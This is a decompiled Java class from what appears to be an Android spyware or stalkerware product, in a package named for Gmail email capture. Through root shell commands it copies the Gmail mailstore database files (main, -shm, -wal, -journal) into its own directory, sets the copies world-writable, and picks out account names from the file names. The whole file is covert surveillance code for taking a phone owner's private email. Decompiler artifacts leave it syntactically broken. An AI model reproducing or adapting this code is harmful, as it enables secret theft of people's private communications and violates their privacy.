package com.vvt.capture.email.gmail.a;

import com.vvt.capture.email.gmail.b;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.LinuxFile;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class c
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public static String a()
  {
    String[] arrayOfString = b.b();
    int i = arrayOfString.length;
    int j = 0;
    String str = null;
    int k = 0;
    if (k < i)
    {
      str = arrayOfString[k];
      boolean bool = ShellUtil.b(str);
      if (!bool) {}
    }
    for (;;)
    {
      return str;
      j = k + 1;
      k = j;
      break;
      j = 0;
      str = null;
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    int i = 1;
    int j = 0;
    Object localObject1 = null;
    Object localObject2 = com.vvt.capture.email.gmail.c.a(paramString1, paramString2);
    boolean bool1 = ShellUtil.b((String)localObject2);
    String str1 = b(paramString3);
    Object localObject3 = new Object[i];
    localObject3[0] = paramString2;
    Object localObject4 = String.format("mailstore.%s.db", (Object[])localObject3);
    localObject4 = p.a(str1, (String)localObject4);
    Object localObject5;
    if (bool1)
    {
      localObject5 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
      i = 5;
    }
    try
    {
      localObject3 = new Object[i];
      j = 0;
      localObject1 = null;
      localObject3[0] = str1;
      j = 1;
      localObject3[j] = str1;
      j = 2;
      localObject3[j] = paramString4;
      j = 3;
      localObject3[j] = paramString4;
      j = 4;
      localObject3[j] = str1;
      localObject5 = String.format((String)localObject5, (Object[])localObject3);
      KMShell.a((String)localObject5);
      bool1 = com.vvt.aa.a.c();
      if (bool1) {
        ShellUtil.k(str1);
      }
      localObject3 = new java/util/Hashtable;
      ((Hashtable)localObject3).<init>();
      ((Hashtable)localObject3).put(localObject2, localObject4);
      localObject5 = new java/lang/StringBuilder;
      ((StringBuilder)localObject5).<init>();
      localObject5 = ((StringBuilder)localObject5).append((String)localObject2);
      localObject1 = "-shm";
      localObject5 = ((StringBuilder)localObject5).append((String)localObject1);
      localObject5 = ((StringBuilder)localObject5).toString();
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject1 = ((StringBuilder)localObject1).append((String)localObject4);
      Object localObject6 = "-shm";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject6);
      localObject1 = ((StringBuilder)localObject1).toString();
      ((Hashtable)localObject3).put(localObject5, localObject1);
      localObject5 = new java/lang/StringBuilder;
      ((StringBuilder)localObject5).<init>();
      localObject5 = ((StringBuilder)localObject5).append((String)localObject2);
      localObject1 = "-wal";
      localObject5 = ((StringBuilder)localObject5).append((String)localObject1);
      localObject5 = ((StringBuilder)localObject5).toString();
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject1 = ((StringBuilder)localObject1).append((String)localObject4);
      localObject6 = "-wal";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject6);
      localObject1 = ((StringBuilder)localObject1).toString();
      ((Hashtable)localObject3).put(localObject5, localObject1);
      localObject5 = new java/lang/StringBuilder;
      ((StringBuilder)localObject5).<init>();
      localObject2 = ((StringBuilder)localObject5).append((String)localObject2);
      localObject5 = "-journal";
      localObject2 = ((StringBuilder)localObject2).append((String)localObject5);
      localObject2 = ((StringBuilder)localObject2).toString();
      localObject5 = new java/lang/StringBuilder;
      ((StringBuilder)localObject5).<init>();
      localObject5 = ((StringBuilder)localObject5).append((String)localObject4);
      localObject4 = "-journal";
      localObject5 = ((StringBuilder)localObject5).append((String)localObject4);
      localObject5 = ((StringBuilder)localObject5).toString();
      ((Hashtable)localObject3).put(localObject2, localObject5);
      localObject4 = ((Hashtable)localObject3).keys();
      for (;;)
      {
        boolean bool2 = ((Enumeration)localObject4).hasMoreElements();
        if (!bool2) {
          break;
        }
        localObject2 = ((Enumeration)localObject4).nextElement();
        localObject2 = (String)localObject2;
        localObject5 = ((Hashtable)localObject3).get(localObject2);
        localObject5 = (String)localObject5;
        localObject1 = "%s cp %s %s; chmod 777 %s; chown %s.%s %s";
        int m = 7;
        localObject6 = new Object[m];
        int n = 0;
        String str2 = c(paramString3);
        localObject6[0] = str2;
        n = 1;
        localObject6[n] = localObject2;
        int k = 2;
        localObject6[k] = localObject5;
        k = 3;
        localObject6[k] = localObject5;
        k = 4;
        localObject6[k] = paramString4;
        k = 5;
        localObject6[k] = paramString4;
        k = 6;
        localObject6[k] = localObject5;
        localObject2 = String.format((String)localObject1, (Object[])localObject6);
        KMShell.a((String)localObject2);
        bool3 = com.vvt.aa.a.c();
        if (bool3) {
          ShellUtil.k((String)localObject5);
        }
        bool3 = a;
        if (!bool3) {}
      }
      bool3 = a;
      if (!bool3) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    return str1;
  }
  
  public static HashSet a(String paramString)
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    boolean bool1 = true;
    Object localObject1 = LinuxFile.a(paramString, bool1);
    if (localObject1 != null)
    {
      int i = ((ArrayList)localObject1).size();
      if (i > 0)
      {
        Pattern localPattern = Pattern.compile("(mailstore){1}(.)*(@gmail.com.db){1}");
        Iterator localIterator = ((ArrayList)localObject1).iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          localObject1 = (LinuxFile)localIterator.next();
          Object localObject2 = ((LinuxFile)localObject1).d();
          localObject2 = localPattern.matcher((CharSequence)localObject2);
          boolean bool2 = ((Matcher)localObject2).find();
          if (bool2)
          {
            String str = ((LinuxFile)localObject1).d();
            bool2 = com.vvt.p.c.a(str);
            if (bool2)
            {
              int j = ((Matcher)localObject2).start();
              int k = ((Matcher)localObject2).end();
              localObject1 = ((LinuxFile)localObject1).d();
              j += 10;
              k += -3;
              localObject1 = ((String)localObject1).substring(j, k);
              localHashSet.add(localObject1);
            }
          }
        }
      }
    }
    return localHashSet;
  }
  
  public static String b(String paramString)
  {
    return p.a(paramString, "gm");
  }
  
  public static String c(String paramString)
  {
    return p.a(paramString, "busybox");
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/gmail/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */